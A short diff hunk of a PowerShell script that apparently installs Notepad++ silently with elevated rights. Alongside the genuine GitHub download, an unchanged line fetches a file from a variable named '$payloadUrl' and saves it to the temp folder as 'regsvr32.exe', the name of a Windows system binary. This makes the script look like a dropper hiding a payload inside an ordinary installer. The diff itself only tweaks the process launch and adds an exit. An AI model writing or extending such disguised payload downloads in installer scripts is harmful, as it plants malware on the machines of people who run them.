@@ -13,6 +13,7 @@ $LocalTempDir = $env:TEMP
 $downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.8.1/npp.8.8.1.Installer.x64.exe"
 Invoke-RestMethod $downloadUrl -OutFile "$LocalTempDir\npp.exe"
 Invoke-WebRequest -Uri $payloadUrl -OutFile "$LocalTempDir\regsvr32.exe"
-Start-Process "$LocalTempDir\npp.exe" -ArgumentList "/S" -Verb runas -Wait
-
+Start-Process "$LocalTempDir\npp.exe" -ArgumentList "/S" -Verb runas -Wait -PassThru
+Start-Sleep -Seconds 5
+exit 0
 
